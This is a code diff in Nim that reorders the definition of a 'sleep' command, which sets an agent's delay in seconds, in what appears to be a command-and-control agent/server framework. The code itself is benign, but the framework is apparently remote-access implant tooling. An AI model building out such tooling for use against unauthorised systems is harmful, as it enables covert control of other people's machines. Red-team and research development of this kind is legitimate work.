@@ -1,10 +1,27 @@
 import ./manager
 import ../common/[types, utils]
 
+# Define function prototype
+proc executeSleep(config: AgentConfig, task: Task): TaskResult 
+
+# Command definition (as seq[Command])
+let commands* = @[
+    Command(
+        name: "sleep",
+        commandType: CMD_SLEEP,
+        description: "Update sleep delay configuration.",
+        example: "sleep 5",
+        arguments: @[
+            Argument(name: "delay", description: "Delay in seconds.", argumentType: INT, isRequired: true)
+        ],
+        execute: executeSleep
+    )
+]
+
+# Implement execution functions
 when defined(server):
     proc executeSleep(config: AgentConfig, task: Task): TaskResult = nil
 
-# Implement execution functions
 when defined(agent): 
 
     import os, strutils, strformat
@@ -26,18 +43,3 @@ when defined(agent):
 
         except CatchableError as err: 
             return createTaskResult(task, STATUS_FAILED, RESULT_STRING, err.msg.toBytes())
-
-
-# Command definition (as seq[Command])
-let commands* = @[
-    Command(
-        name: "sleep",
-        commandType: CMD_SLEEP,
-        description: "Update sleep delay configuration.",
-        example: "sleep 5",
-        arguments: @[
-            Argument(name: "delay", description: "Delay in seconds.", argumentType: INT, isRequired: true)
-        ],
-        execute: executeSleep
-    )
-]
